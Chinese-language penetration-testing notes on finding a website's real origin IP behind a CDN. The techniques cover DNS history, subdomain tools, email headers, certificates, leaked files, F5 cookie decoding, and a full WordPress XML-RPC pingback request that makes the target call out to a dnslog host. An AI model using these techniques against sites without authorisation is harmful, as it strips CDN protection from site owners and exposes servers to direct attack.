# CDN绕过

## 1、利用历史记录

> 通过查询 DNS 记录 / IP 历史记录 / 子域名 等数据记录

很多网站只给关键的域名或者主域名做了 CDN，其下很多子域名没有使用 CDN 服务，所以我们可 以通过查询目标网站的根域名、二级域名、三级域名甚至多级子域名来获得真实IP。不过有时候查 出来的并不是真实 IP，可能仅仅做了 A 记录 ，这种情况下可以继续扫描同 C 段的 IP 和端口，然后 逐个探测是否为目标网站。 在网站使用 CDN 服务之前，解析的是真实IP，所以可以查询 DNS 历史记录，看是否能探测到使用 CDN 之前的 IP 。 DNS 解析记录中重点关注 TXT 记录和 SPF 记录，是否有泄露真实IP。

### 1.1 在线查询平台

https://ipw.cn/dns/  DNS记录参考

https://www.ip138.com/  IP历史

https://chaziyu.com/  子域名

微步Threatbook：https://x.threatbook.cn/ 

Viewdns：https://viewdns.info/

Dnsdb：https://www.dnsdb.io/zh-cn/

### 1.2 网络空间测绘搜索引擎

Censys https://censys.io/

FOFA https://fofa.info

Shodan https://www.shodan.io/

Zoomeye https://www.zoomeye.org/ 

hunter https://hunter.qianxin.com/

quake https://quake.360.net/quake/ 

### 1.3 工具和脚本

SubDomainsBrute https://github.com/lijiejie/subDomainsBrute 

ESD https://github.com/FeeiCN/ESD

Layer 子域名挖掘机 https://github.com/euphrat1ca/LayerDomainFinder 

Xray https://github.com/chaitin/xray （subdomain 子域名发掘功能）

**重点：oneforall  https://github.com/shmilylty/OneForAll**

## 2、通过Email

> 具体没试过

一般大型网站自己部署架设的邮件服务器如果向外部用户发送邮件的话，如果中间未经任何数据处理和防护措施，那么邮件头部的源码中会包含此邮件服务器的真实 IP 地址。

小技巧：通过发送邮件给一个不存在的邮箱地址，由于该用户不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件的服务器的真实IP通知。

## 3、通过 SSL 证书

证书颁发机构 (CA) 必须将他们发布的每个 SSL/TLS 证书发布到公共日志中，SSL/TLS 证书通常包 含域名、子域名和电子邮件地址。因此可以利用 SSL/TLS 证书来发现目标站点的真实 IP 地址。

CDN 运营商在给服务器提供保护的同时，也会与其服务器进行加密通信（ssl），这时当服务器的 443 端口接入域名时也会在 443 端口暴露其证书，我们通过证书比对便可发现网站的真实IP地址。

## 4、通过海外DNS查询及多点ping 

针对国内市场用户，部分的 CDN 服务商并没有做海外市场的 CDN ，所以可以通过寻找小众、冷门 的海外 DNS 查询，看是否能获得真实 IP 。

``` 
nslookup target.com <海外 DNS 地址>
```

多点ping推荐站长之家：https://ping.chinaz.com

## 5、通过敏感文件泄露

例如：

- 服务器日志文件
- 探针文件，例如 phpinfo 
- 网站备份压缩文件 .
- DS_Store 
- .hg 
- .git
- SVN
- Web.xml

主要靠字典

## 6、通过变更的域名

> （查询whois信息） 

很多网站在发展的过程中，会更换域名，比如京东以前的域名是 360buy.com ，后来斥巨资购买了 jd.com 。 网站在更换新域名时，如果将 CDN 部署到新的域名上，而之前的域名由于没过期，可能未使用 CDN，因此可以直接获得服务器 IP。

## 7、 通过APP移动端应用

如果网站存在 APP，可以通过抓包分析其APP的数据流量，看是否能找到网站真实IP地址，记得关注APP的历史版本 。

##  8、通过 F5 LTM 解码

> 第一次听说这东西

LTM 是将所有的应用请求分配到多个节点服务器上。提高业务的处理能力，也就是负载均衡。 当服务器使用F5 LTM做负载均衡时，通过对 set-cookie 关键字的解码，可以获取服务器真实 ip 地址。 例如：

``` 
Set-Cookie: BIGipServerpool_9.29_5229=605532106.22012.0000
```

- 先把第一小节的十进制数，即 605532106 取出来
- 将其转为十六进制数 2417afca
- 接着从后至前，取四个字节出来:CA AF 17 24 
- 最后依次转为十进制数 202.175.23.36，即是服务器的真实ip地址。

## 9、通过 CDN 标头特征值

> 感觉太麻烦了，以后再说

很多网站启用CDN后，配置了拒绝直接访问真实IP ，可以通过匹配特征标头的方法，去缩小范围。

## 10、通过 XML-RPC PINGBACK 通信

> wordpress才好用

在 WordPress 的早期版本中，默认情况下已关闭 XML-RPC，但是从3.5版本开始，默认情况下开 启。 XML-RPC 支持 trackback 和 pingback。

```http
POST /xmlrpc.php HTTP/1.1
Host: domain.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/70.0.3538.110 Safari/537.36
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;
q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 323
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://2vbis4.dnslog.cn</string></value>
</param>
<param>
<value><string>https://domain.com/</string></value>
</param>
</params>
</methodCall
```

刷新一下dnslog，可以获得了真实服务器IP。

## 11、通过 favicon.ico 哈希特征

资产测绘平台都支持

## 12、通过网页源码特征值

> 资产测绘平台，但是不会

